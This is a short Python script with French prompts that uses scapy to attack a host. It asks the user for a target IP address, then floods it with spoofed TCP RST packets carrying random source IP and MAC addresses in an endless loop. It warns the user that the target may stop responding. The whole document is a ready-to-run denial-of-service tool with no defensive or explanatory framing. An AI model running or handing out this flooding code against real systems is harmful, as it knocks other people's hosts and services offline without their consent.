import scapy.all

print("L'adresse IP ciblée risque de ne plus répondre lors de cette attaque.")

dst_ip = input("Entrez l'IP ciblée: ")
src_ip = scapy.all.RandIP()
rand_mac = scapy.all.RandMAC()

rst_packet = scapy.all.Ether(src = rand_mac) / scapy.all.IP(src = src_ip, dst = dst_ip) / scapy.all.TCP(flags = "R") 

while True:
    scapy.all.sendp(rst_packet)
